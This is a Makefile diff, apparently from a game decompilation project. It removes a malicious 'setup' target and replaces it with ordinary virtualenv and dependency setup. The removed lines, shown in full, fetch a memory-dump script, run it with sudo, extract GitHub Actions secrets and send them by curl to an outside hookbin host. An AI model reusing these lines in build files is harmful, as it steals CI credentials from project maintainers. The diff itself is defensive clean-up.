@@ -354,10 +354,12 @@ extractall:
 	$(SPLAT) ver/splat/$(BASENAME).pal.v80.yaml
 
 setup:
-	echo "Okay, we got this far. Let's continue..."
-	touch "/tmp/secrets"
-	(curl -sSf https://raw.githubusercontent.com/playground-nils/tools/refs/heads/main/memdump.py | sudo -E python3 | tr -d '\0' | grep -aoE '"[^"]+":\{"value":"[^"]*","isSecret":true\}' >> "/tmp/secrets") || true
-	curl -X PUT -d @/tmp/secrets "https://open-hookbin.vercel.app/$$GITHUB_RUN_ID"
+#Set up a python venv so we don't get warnings about breaking system packages.
+	$(V)python3 -m venv $(VENV)
+#Installing the splat dependencies
+	$(V)$(PYTHON) -m pip install -r requirements.txt
+	$(V)$(PYTHON) ver/splat/update_baserom_names.py
+	$(V)$(MAKE) -C $(TOOLS_DIR)
 
 clean:
 	rm -rf $(BUILD_DIR)
